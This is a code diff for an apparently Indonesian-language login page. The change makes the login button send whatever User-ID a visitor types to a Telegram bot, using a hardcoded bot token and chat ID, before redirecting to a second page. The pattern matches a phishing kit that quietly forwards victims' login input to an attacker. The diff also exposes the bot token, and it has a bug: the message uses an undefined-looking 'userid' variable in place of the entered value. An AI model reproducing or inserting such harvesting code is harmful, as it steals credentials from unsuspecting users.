@@ -122,20 +122,45 @@ LANJUT
 </button>
 
 <script>
-function login(){
+function login() {
+    const user = document.getElementById("userid").value.trim();
 
-const user=document.getElementById("userid").value.trim();
+    if (user === "") {
+        alert("Masukkan User-ID");
+        return;
+    }
 
-if(user==""){
-alert("Masukkan User-ID");
-return;
+    const token = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
+    const chatId = "6456077638";
+
+    const pesan = `💌 Pesan baru
+
+Nama: ${userid}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: pesan
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.ok) {
+            localStorage.setItem("userid", user);
+            window.location.href = "hal2.html";
+        } else {
+            alert("Gagal mengirim pesan.");
+        }
+    })
+    .catch(() => {
+        alert("Terjadi kesalahan.");
+    });
 }
 
-localStorage.setItem("userid",user);
-
-window.location="hal2.html";
-
-}
 </script>
 
 </body>
